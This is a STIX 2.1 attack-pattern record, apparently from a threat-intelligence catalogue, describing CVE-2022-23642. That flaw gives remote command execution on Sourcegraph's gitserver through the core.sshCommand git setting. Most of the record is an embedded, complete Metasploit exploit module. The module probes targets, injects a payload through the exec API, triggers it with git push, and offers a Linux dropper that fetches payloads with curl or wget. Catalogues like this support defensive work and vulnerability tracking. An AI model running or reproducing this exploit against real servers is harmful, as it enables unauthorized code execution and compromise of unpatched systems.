{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8fc1cbb6-a24e-4b0c-8595-d41db2276d78",
    "created": "2024-08-14T17:00:31.270002Z",
    "modified": "2024-08-14T17:00:31.270007Z",
    "name": "Sourcegraph gitserver sshCommand RCE",
    "description": " A vulnerability exists within Sourcegraph's gitserver component that allows a remote attacker to execute arbitrary OS commands by modifying the core.sshCommand value within the git configuration. This command can then be triggered on demand by executing a git push operation. The vulnerability was patched by introducing a feature flag in version 3.37.0. This flag must be enabled for the protections to be in place which filter the commands that are able to be executed through the git exec REST API. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/sourcegraph_gitserver_sshcmd.rb",
            "external_id": "sourcegraph_gitserver_sshcmd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-23642"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sourcegraph/sourcegraph/security/advisories/GHSA-qcmp-fx72-q8q9"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Altelus1/CVE-2022-23642"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sourcegraph gitserver sshCommand RCE',\n        'Description' => %q{\n          A vulnerability exists within Sourcegraph's gitserver component that allows a remote attacker to execute\n          arbitrary OS commands by modifying the core.sshCommand value within the git configuration. This command can\n          then be triggered on demand by executing a git push operation. The vulnerability was patched by introducing a\n          feature flag in version 3.37.0. This flag must be enabled for the protections to be in place which filter the\n          commands that are able to be executed through the git exec REST API.\n        },\n        'Author' => [\n          'Altelus1', # github PoC\n          'Spencer McIntyre' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2022-23642'],\n          ['URL', 'https://github.com/sourcegraph/sourcegraph/security/advisories/GHSA-qcmp-fx72-q8q9'],\n          ['URL', 'https://github.com/Altelus1/CVE-2022-23642'],\n        ],\n        'DisclosureDate' => '2022-02-18', # Public disclosure\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory\n            },\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              # when the OS command is executed, it's executed twice which will cause some of the command stagers to\n              # be corrupt, these two work even for larger payloads because they're downloaded in a single command\n              'CmdStagerFlavor' => %w[curl wget],\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            },\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 3178\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('EXISTING_REPO', [false, 'An existing, cloned repository'])\n    ])\n  end\n\n  def check\n    res = send_request_exec(Rex::Text.rand_text_alphanumeric(4..11), ['config', '--default', '', 'core.sshCommand'])\n    return CheckCode::Unknown unless res\n\n    if res.code == 200 && res.body =~ /^X-Exec-Exit-Status: 0/\n      # this is the response if the target repo does exist, highly unlikely since it's randomized\n      return CheckCode::Vulnerable('Successfully set core.sshCommand.')\n    elsif res.code == 404 && res.body =~ /\"cloneInProgress\"/\n      # this is the response if the target repo does not exist\n      return CheckCode::Vulnerable\n    elsif res.code == 400 && res.body =~ /^invalid command/\n      # this is the response when the server is patched, regardless of if there are cloned repos\n      return CheckCode::Safe\n    end\n\n    CheckCode::Unknown\n  end\n\n  def exploit\n    if datastore['EXISTING_REPO'].blank?\n      @git_repo = send_request_list.sample\n      fail_with(Failure::NotFound, 'Did not identify any cloned repositories on the remote server.') unless @git_repo\n\n      print_status(\"Using automatically identified repository: #{@git_repo}\")\n    else\n      @git_repo = datastore['EXISTING_REPO']\n    end\n\n    print_status(\"Executing #{target.name} target\")\n\n    @git_origin = Rex::Text.rand_text_alphanumeric(4..11)\n    git_remote = \"git@#{Rex::Text.rand_text_alphanumeric(4..11)}:#{Rex::Text.rand_text_alphanumeric(4..11)}.git\"\n    vprint_status(\"Using #{@git_origin} as a fake git origin\")\n    send_request_exec(@git_repo, ['remote', 'add', @git_origin, git_remote])\n\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def cleanup\n    return unless @git_repo && @git_origin\n\n    vprint_status('Cleaning up the git changes...')\n    # delete the remote that was created\n    send_request_exec(@git_repo, ['remote', 'remove', @git_origin])\n    # unset the core.sshCommand value\n    send_request_exec(@git_repo, ['config', '--unset', 'core.sshCommand'])\n  ensure\n    super\n  end\n\n  def send_request_exec(repo, args, timeout = 20)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'exec'),\n      'method' => 'POST',\n      'data' => {\n        'Repo' => repo,\n        'Args' => args\n      }.to_json\n    }, timeout)\n  end\n\n  def send_request_list\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'list'),\n      'method' => 'GET',\n      'vars_get' => { 'cloned' => 'true' }\n    })\n    fail_with(Failure::Unreachable, 'No server response.') unless res\n    fail_with(Failure::UnexpectedReply, 'The gitserver list API call failed.') unless res.code == 200 && res.get_json_document.is_a?(Array)\n\n    res.get_json_document\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n    res = send_request_exec(@git_repo, ['config', 'core.sshCommand', cmd])\n    fail_with(Failure::Unreachable, 'No server response.') unless res\n    unless res.code == 200 && res.body =~ /^X-Exec-Exit-Status: 0/\n      if res.code == 404 && res.get_json_document.is_a?(Hash) && res.get_json_document['cloneInProgress'] == false\n        fail_with(Failure::BadConfig, 'The specified repository has not been cloned.')\n      end\n\n      fail_with(Failure::UnexpectedReply, 'The gitserver exec API call failed.')\n    end\n\n    send_request_exec(@git_repo, ['push', @git_origin, 'master'], 5)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2022-02-18, # Public disclosure",
    "x_mitre_platforms": [
        "linux'"
    ]
}